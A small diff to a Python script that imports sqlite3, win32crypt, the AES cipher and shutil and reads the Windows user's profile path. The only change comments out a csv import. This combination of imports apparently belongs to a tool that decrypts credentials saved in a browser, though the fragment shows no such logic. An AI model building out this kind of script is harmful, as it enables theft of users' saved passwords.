@@ -20,7 +20,7 @@ import sqlite3
 import win32crypt
 from Cryptodome.Cipher import AES
 import shutil
-import csv
+#import csv (in the next updates)
 
 username = os.environ["USERNAME"]
 userprofile = os.environ["USERPROFILE"]
